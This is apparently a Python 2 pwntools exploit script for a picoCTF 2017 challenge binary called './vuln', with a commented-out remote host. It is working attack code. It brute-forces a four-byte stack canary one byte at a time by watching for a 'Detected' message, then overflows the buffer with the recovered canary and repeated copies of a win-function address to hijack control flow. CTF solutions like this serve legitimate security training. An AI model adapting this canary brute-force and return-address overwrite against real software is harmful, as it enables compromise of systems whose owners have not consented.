from pwn import *

canary = ""
r = None
win_address = 0x80486eb

def bruteforce_canary(b):
	global canary
	print b
	r.recvuntil("put>")
	payload = "A"*32+canary
	payload += chr(b)
	r.send(payload)
	print payload
	result = r.recvline()
	print result
	if "Detected" not in result:
		canary += chr(int(hex(b)[2:], 16))
		return True
	else:
		return False

def handle_start(current_char):
	global r
	r = process(['./vuln'])
	r.recvuntil(">")
	r.sendline(str(40))
	return bruteforce_canary(current_char)

def handle_logic():
	global r
	for i in range(4):
		for j in range (1, 256):
			if handle_start(j) == False:
				r.close()
			else:
				r.close()
				break
		print str(canary)
	calculated_canary = "".join([hex(ord(asc))[2:] for asc in canary])
	calculated_canary = "0x"+("".join([calculated_canary[i]+calculated_canary[i+1] for i in range(0,8, 2)][::-1]))
	print (calculated_canary)
	r = process(['./vuln'])
	r.recvuntil(">")
	r.sendline(str(70))
	r.recvuntil("put>")
	payload = "A"*32
	payload += p32(int(calculated_canary, 16))
	payload += p32(win_address)*5
	r.send(payload)

	
if __name__ == "__main__":
	#r = remote("shell2017.picoctf.com", 36069)
	handle_logic()
	r.interactive()